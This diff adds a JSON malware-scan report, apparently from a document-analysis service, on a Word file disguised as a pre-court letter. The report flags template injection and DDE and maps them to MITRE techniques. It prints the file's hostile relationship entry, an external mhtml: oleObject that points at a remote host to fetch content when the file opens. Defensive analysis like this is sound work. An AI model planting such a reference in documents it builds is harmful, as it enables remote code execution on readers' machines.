@@ -1,0 +1,95 @@
+{
+  {
+    "FileName": "A Letter before court 4.docx",
+    "FileType": "OOXML Word File",
+    "FileSha256Hash": "938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52",
+    "FileMD5Hash": "1d2094ce85d66878ee079185e2761beb",
+    "FileSize": "23.6 KB",
+    "Verdict": "Malicious",
+    "AlertLevel": 8,
+    "Date": "2021-09-08T16:19:27.668+03:00",
+    "bVbaStomping": "Not Detected",
+    "bVbaPurging": "Not Detected",
+    "bSuspiciousModuleName": "Not Detected",
+    "bDDE": "Detected",
+    "bObfuscation": "Not Detected",
+    "bBlacklistApi": "Not Detected",
+    "bUnviewable": "Not Detected",
+    "bGuiHide": "Not Detected",
+    "bSuspiciousPassword": "Not Detected",
+    "bExported": null,
+    "bSuspiciousCreator": "Not Detected",
+    "bAmsiScanResult": "Not Detected",
+    "bSuspiciousEncryption": "Not Detected",
+    "bSuspiciousEmbeddedObjects": "Not Detected",
+    "bSuspiciousRTFObjects": "Not Detected",
+    "bSuspiciousURL": "Detected",
+    "bSuspiciousExternalResource": "Detected",
+    "bTemplateInjection": "Detected",
+    "bSuspiciousOfficePlugin": "Not Detected",
+    "bExcel4MacroSheets": "Not Detected",
+    "bHiddenSheet": "Not Detected",
+    "SuspiciousCreatorAppName": null,
+    "sanitizedFileDownloadPath": null,
+    "bFileSanitized": "No Sanitize",
+    "bTamperedFile": "Not Detected",
+    "bLegacyExcel": "Not Detected",
+    "bSuspiciousJSCode": "Not Detected",
+    "bFakePDFSigned": "Not Detected",
+    "amsiDetectModuleNames": null,
+    "sanitizedFileNames": null,
+    "stompingModuleNames": null,
+    "imageDownloadStrings": [
+      "https://api.docguard.net:8443/MediaFiles/14c02616-b832-4217-b039-ca081cdf917d/image1.jpeg"
+    ],
+    "macroSnippet": null,
+    "ddeSnippet": [
+      {
+        "blackListString": "/2006/relationships/oleObject\" Target=\"mhtml:http://hidusi.com/e8c76295a5f9acb7/side.html!x-usc:http://hidusi.com/e8c76295a5f9acb7/side.html\" TargetMode=\"External\"/><Relationship Id=\"rId5\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\" Target=\"media/image2.wmf\"/><Re",
+        "detectString": "",
+        "moduleName": "\\word\\_rels\\document.xml.rels",
+        "FileName": ""
+      }
+    ],
+    "fileSnippet": [],
+    "embeddedFileInfos": null,
+    "urlInfos": [
+      {
+        "url": "http://hidusi.com/e8c76295a5f9acb7/side.html",
+        "fileName": "document.xml.rels",
+        "fullPath": "document.xml.rels"
+      }
+    ],
+    "bucketFileInfo": [],
+    "exceptionLists": null,
+    "workbookWebResults": null,
+    "Mitre": [
+      {
+        "TacticsId": "TA0002",
+        "TacticName": "Execution",
+        "TechniqueId": "T1203",
+        "TechniqueName": "Exploitation for Client Execution"
+      },
+      {
+        "TacticsId": "TA0005",
+        "TacticName": "Defense Evasion",
+        "TechniqueId": "T1221",
+        "TechniqueName": "Template Injection"
+      }
+    ],
+    "Finding": [
+      {
+        "FindingText": "Document is poisoned with Template scheme, through url",
+        "DetailsText": "Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run."
+      },
+      {
+        "FindingText": "The sample has suspicious references in Office document templates to conceal malicious code or force authentication attempts.",
+        "DetailsText": "Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched."
+      }
+    ],
+    "defaultMessage": "This file has already been analyzed ",
+    "analyzerMessage": null,
+    "errormessage": null,
+    "hashFound": true
+  }
+}
